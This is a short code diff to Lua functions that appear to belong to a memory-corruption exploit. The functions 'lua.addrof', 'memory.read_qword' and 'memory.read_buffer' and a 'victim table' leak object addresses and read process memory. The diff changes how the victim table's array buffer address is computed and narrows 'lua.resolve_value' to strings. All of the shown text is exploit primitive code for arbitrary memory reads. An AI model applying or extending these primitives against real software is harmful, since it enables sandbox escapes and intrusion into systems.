@@ -253,7 +253,7 @@ end
 -- setup a table where we can read its array buffer
 function lua.setup_victim_table()
     local t = { 1, 2, 3, 4 }
-    local array_addr = memory.read_qword(lua.resolve_value(t))
+    local array_addr = memory.read_qword(lua.addrof(t)+24)
     if array_addr then
         if memory.read_buffer(array_addr, 1) then  -- test if we can read the buffer
             lua.tbl_victim, lua.tbl_victim_array_addr = t, array_addr
@@ -295,7 +295,7 @@ function lua.addrof(obj)
 end
 
 function lua.resolve_value(v)
-    if type(v) == "string" or type(v) == "table" then
+    if type(v) == "string" then
         return lua.addrof(v)+24
     elseif type(v) == "number" then
         return uint64(v)
